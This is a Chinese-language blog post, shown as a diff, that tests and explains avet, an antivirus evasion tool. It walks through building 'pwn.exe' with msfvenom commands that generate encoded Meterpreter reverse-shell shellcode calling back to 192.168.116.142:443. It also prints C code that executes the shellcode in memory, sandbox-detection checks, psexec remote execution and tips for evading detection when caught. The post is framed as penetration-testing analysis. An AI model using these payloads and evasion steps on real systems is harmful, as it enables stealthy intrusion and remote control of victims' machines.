@@ -1,0 +1,381 @@
+<article class="post">
+  <h1>AntiVirus Evasion Tool(avet)测试分析</h1>
+
+  <div class="entry">
+    <h2 id="0x00-前言">0x00 前言</h2>
+<hr>
+
+<p>avet是一款用来绕过杀毒软件检测的工具，使用了多种不同的反病毒规避技术。</p>
+
+<p>分别入选blackhat ASIA 2017 arsnal、blackhat USA 2017 arsnal和blackhat USA 2018 arsnal：</p>
+
+<p>https://www.blackhat.com/asia-17/arsenal.html#avet-antivirus-evasion-tool</p>
+
+<p>https://www.blackhat.com/us-17/arsenal/schedule/index.html#avet—antivirus-evasion-tool-7908</p>
+
+<p>https://www.blackhat.com/us-18/arsenal/schedule/index.html#avet-antivirus-evasion-tool-10692</p>
+
+<p>github开源地址：</p>
+
+<p>https://github.com/govolution/avet</p>
+
+<p>本文将要对其进行测试，结合自己的经验分析avet使用的反病毒规避技术</p>
+
+<h2 id="0x01-简介">0x01 简介</h2>
+<hr>
+
+<p>本文将要介绍以下内容：</p>
+
+<ul>
+  <li>环境搭建</li>
+  <li>使用流程</li>
+  <li>工具实现细节</li>
+  <li>技术细节分析</li>
+</ul>
+
+<h2 id="0x02-环境搭建">0x02 环境搭建</h2>
+<hr>
+
+<p>测试系统：<code class="language-plaintext highlighter-rouge">kali2 x64</code></p>
+
+<h3 id="1下载">1、下载</h3>
+
+<p>https://github.com/govolution/avet</p>
+
+<h3 id="2编译">2、编译</h3>
+
+<p>如果使用32位kali系统，需要编译</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc -o make_avet make_avet.c
+</code></pre></div></div>
+
+<p>64位kali系统不需要</p>
+
+<h3 id="3安装wine32">3、安装wine32</h3>
+
+<p>否则，无法生成exe</p>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-8-15/2-1.png" alt="Alt text"></p>
+
+<p>安装命令：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install wine32
+</code></pre></div></div>
+
+<h3 id="4安装tdm-gcc">4、安装TDM GCC</h3>
+
+<p>参考地址：</p>
+
+<p>https://govolution.wordpress.com/2017/02/04/using-tdm-gcc-with-kali-2/</p>
+
+<p>下载：</p>
+
+<p>https://sourceforge.net/projects/tdm-gcc/</p>
+
+<p>安装：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wine tdm64-gcc-5.1.0-2.exe
+</code></pre></div></div>
+
+<p>弹出安装窗口，选择<code class="language-plaintext highlighter-rouge">Create</code></p>
+
+<p>选择<code class="language-plaintext highlighter-rouge">MinGW-w64/TDM64(32-bit and 64-bit)</code></p>
+
+<p>接下来，均选择默认设置，最后安装</p>
+
+<h3 id="5测试">5、测试</h3>
+
+<p>执行：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./make_avet -h
+</code></pre></div></div>
+
+<p>获得参数说明</p>
+
+<h2 id="0x03-使用流程">0x03 使用流程</h2>
+<hr>
+
+<h3 id="1执行avet_fabricpy">1、执行avet_fabric.py</h3>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-8-15/3-1.png" alt="Alt text"></p>
+
+<h3 id="2选择script">2、选择script</h3>
+
+<p>这里选择<code class="language-plaintext highlighter-rouge">7: build_win64_meterpreter_rev_tcp_xor.sh</code></p>
+
+<h3 id="3编辑脚本内容">3、编辑脚本内容</h3>
+
+<p>显示默认脚本内容，可进行修改，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-8-15/3-2.png" alt="Alt text"></p>
+
+<p><strong>注：</strong></p>
+
+<p>脚本内容对应文件<code class="language-plaintext highlighter-rouge">/build/build_win64_meterpreter_rev_tcp_xor.sh</code></p>
+
+<p>默认脚本内容及说明如下：</p>
+
+<p>(1)  指定gcc编译设置，内容为<code class="language-plaintext highlighter-rouge">win64_compiler="wine gcc -m64"</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>. build/global_win64.sh
+</code></pre></div></div>
+
+<p>(2) 使用meterpreter生成reverse payload并保存为sc.txt</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.116.142 lport=443 -e x64/xor -f c --platform Windows &gt; sc.txt
+</code></pre></div></div>
+
+<p>(3) 读取sc.txt的内容，提取出shellcode，删除文件sc.txt</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./format.sh sc.txt &gt; scclean.txt &amp;&amp; rm sc.txt
+</code></pre></div></div>
+
+<p>(4) 调用make_avet，向文件defs.h传入shellcode和功能标志位</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./make_avet -f scclean.txt -X -E
+</code></pre></div></div>
+
+<p>(5) 使用gcc编译avet.c(avet.c会调用defs.h)，生成最终文件pwn.exe</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$win64_compiler -o pwn.exe avet.c
+</code></pre></div></div>
+
+<p>(6) 删除文件scclean.txt，清空文件defs.h</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rm scclean.txt &amp;&amp; echo "" &gt; defs.h
+</code></pre></div></div>
+
+<h3 id="4执行生成最终文件">4、执行，生成最终文件</h3>
+
+<p>确认脚本内容后，输入回车，执行脚本，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-8-15/3-3.png" alt="Alt text"></p>
+
+<p>生成最终文件pwn.exe</p>
+
+<h2 id="0x04-工具实现细节">0x04 工具实现细节</h2>
+<hr>
+
+<h3 id="1通过meterpreter生成payload并保存文件">1、通过meterpreter生成payload并保存文件</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.116.142 lport=443 -e x64/xor -f hex --platform Windows &gt; sc.txt
+</code></pre></div></div>
+
+<p>文件内容如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-8-15/4-1.png" alt="Alt text"></p>
+
+<h3 id="2运行formatsh将shellcode从前面的文件提取出来">2、运行format.sh将shellcode从前面的文件提取出来</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./format.sh sc.txt &gt; scclean.txt
+</code></pre></div></div>
+
+<p>提取后的文件内容如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-8-15/4-2.png" alt="Alt text"></p>
+
+<p><strong>注：</strong></p>
+
+<p>个人认为，以上两步可通过一条命令实现：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.116.142 lport=443 -e x64/xor -f hex --platform Windows &gt; sc.txt
+</code></pre></div></div>
+
+<h3 id="3运行make_avet从前面的文件提取shellcode并设置功能标志位写入文件defsh">3、运行make_avet，从前面的文件提取shellcode，并设置功能标志位，写入文件defs.h</h3>
+
+<p>功能标志位对应make_avet支持的多种功能，可通过执行<code class="language-plaintext highlighter-rouge">./make_avet -h</code>获得详细说明</p>
+
+<p>具体功能如下：</p>
+
+<ul>
+  <li>从指定文件读取shellcode并执行</li>
+  <li>从指定文件读取加密的shellcode，解密后执行</li>
+  <li>调用iexplore.exe访问指定url，获得shellcode并执行</li>
+  <li>通过WinAPI调用socket，访问指定url的80端口，获得shellcode并执行</li>
+  <li>通过certutil下载文件，获得shellcode并执行</li>
+  <li>通过powershell下载文件，获得shellcode并执行</li>
+  <li>使用WinAPI fopen绕过沙盒</li>
+  <li>使用WinAPI gethostbyname绕过沙盒</li>
+  <li>编译成64位</li>
+  <li>隐藏程序窗口</li>
+</ul>
+
+<h3 id="4使用gcc编译avetc生成最终文件">4、使用gcc编译avet.c，生成最终文件</h3>
+
+<p>avet.c为主体程序，从头文件defs.h读取shellcode和功能标志位</p>
+
+<h2 id="0x05-技术细节分析">0x05 技术细节分析</h2>
+<hr>
+
+<h3 id="1执行shellcode的核心代码">1、执行shellcode的核心代码</h3>
+
+<p>(1)</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>void exec_shellcode(unsigned char *shellcode)
+{
+	int (*funct)();
+	funct = (int (*)()) shellcode;
+	(int)(*funct)();
+}
+</code></pre></div></div>
+
+<p>对应生成shellcode的参数：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.116.142 lport=443 -e x86/xor -f hex -a x86 --platform Windows &gt; sc.txt
+</code></pre></div></div>
+
+<p>(2)</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>void exec_shellcode_ASCIIMSF(unsigned char *shellcode)
+{
+	register unsigned char* r asm("eax");
+	r=shellcode;
+	asm("call *%eax;");
+}
+</code></pre></div></div>
+
+<p>对应生成shellcode的参数：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.116.142 lport=443 -e x86/alpha_mixed -f hex -a x86 --platform Windows &gt; sc.txt
+</code></pre></div></div>
+
+<p>(3)</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>void exec_shellcode64(unsigned char *shellcode)
+{
+	int len=strlen(shellcode);
+	DWORD l=0;
+	VirtualProtect(shellcode,len,PAGE_EXECUTE_READWRITE,&amp;l);
+	(* (int(*)()) shellcode)();
+}
+</code></pre></div></div>
+
+<p>生成shellcode的参数：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.116.142 lport=443 -e x64/xor -f hex --platform Windows &gt; sc.txt
+</code></pre></div></div>
+
+<p><strong>注：</strong></p>
+
+<p>shellcode的加密方法还可以选择shikata_ga_nai，使用shikata_ga_nai加密50轮的参数如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.2.103 lport=443 -e x86/shikata_ga_nai -i 50 -f hex -a x86 --platform Windows &gt; sc.txt
+</code></pre></div></div>
+
+<p><strong>补充</strong>：</p>
+
+<p>执行shellcode的方法不唯一，这里再给出另外一种执行shellcode的示例代码：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>void exec_shellcode(unsigned char *shellcode)
+{
+	((void(*)(void))&amp;shellcode)();
+}
+</code></pre></div></div>
+
+<p>shellcode的生成方式也不唯一，可以按照自己的思路生成shellcode</p>
+
+<h3 id="2自己实现的加解密算法">2、自己实现的加解密算法</h3>
+
+<p>加密对应参数为：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./make_avet -E
+</code></pre></div></div>
+
+<p>解密对应的代码为：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>unsigned char* decode_shellcode(unsigned char *buffer, unsigned char *shellcode, int size)
+{
+	int j=0;
+	shellcode=malloc((size/2));
+	int i=0;
+	do
+	{
+		unsigned char temp[3]={0};
+		sprintf((char*)temp,"%c%c",buffer[i],buffer[i+1]);
+		shellcode[j] = strtoul(temp, NULL, 16);
+		i+=2;
+		j++;
+	} while(i&lt;size);
+	return shellcode;
+}
+</code></pre></div></div>
+
+<h3 id="3绕过沙盒">3、绕过沙盒</h3>
+
+<h4 id="1-使用winapi-fopen">(1) 使用WinAPI fopen</h4>
+
+<p>将shellcode保存在文件<code class="language-plaintext highlighter-rouge">c:\windows\system.ini</code>中</p>
+
+<p>主程序运行时读取文件<code class="language-plaintext highlighter-rouge">c:\windows\system.ini</code></p>
+
+<p>如果在沙盒中，无法打开文件<code class="language-plaintext highlighter-rouge">c:\windows\system.ini</code>，主程序自动退出</p>
+
+<p>关键代码：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>FILE *fp = fopen("c:\\windows\\system.ini", "rb");
+if (fp == NULL)
+	return 0;
+fclose(fp);
+</code></pre></div></div>
+
+<h4 id="2-使用winapi-gethostbyname">(2) 使用WinAPI gethostbyname</h4>
+
+<p>主程序调用WinAPI gethostbyname获得指定主机名的主机信息</p>
+
+<p>如果在沙盒中，gethostbyname将会返回NULL，主程序自动退出</p>
+
+<p>关键代码：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>struct hostent *hp = gethostbyname(KVALUE);
+if (hp != NULL) 		
+	exit(0);
+</code></pre></div></div>
+
+<p><strong>注：</strong></p>
+
+<p>判断沙盒条件的方法不唯一，例如系统进程信息、配置信息、设备信息等</p>
+
+<h3 id="4支持psexec远程执行">4、支持psexec远程执行</h3>
+
+<p>主体程序更换为avetsvc.c</p>
+
+<p>avetsvc.c相比于avet.c，代码添加了注册服务的功能，能够通过psexec以服务的方式远程启动</p>
+
+<h2 id="0x06-免杀效果">0x06 免杀效果</h2>
+<hr>
+
+<p>具体免杀效果略</p>
+
+<p>如果被查杀，可以尝试以下方法:</p>
+
+<ul>
+  <li>修改shellcode</li>
+  <li>加密shellcode</li>
+  <li>修改shellcode的加载方式</li>
+  <li>使用含有数字签名的可信程序启动shellcode</li>
+</ul>
+
+<h2 id="0x07-小结">0x07 小结</h2>
+<hr>
+
+<p>本文对avet进行实际测试，分析其中的技术细节，省略实际免杀效果。</p>
+
+<p>总体来说，avet实现了一个完整的框架，在此基础上易于做二次开发，确实能够提高渗透测试人员的效率</p>
+
+<hr>
+
+<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>
+
+
+  </div>
+
+  <div class="date">
+    Written on August 15, 2018
+  </div>
+
+  
+</article>
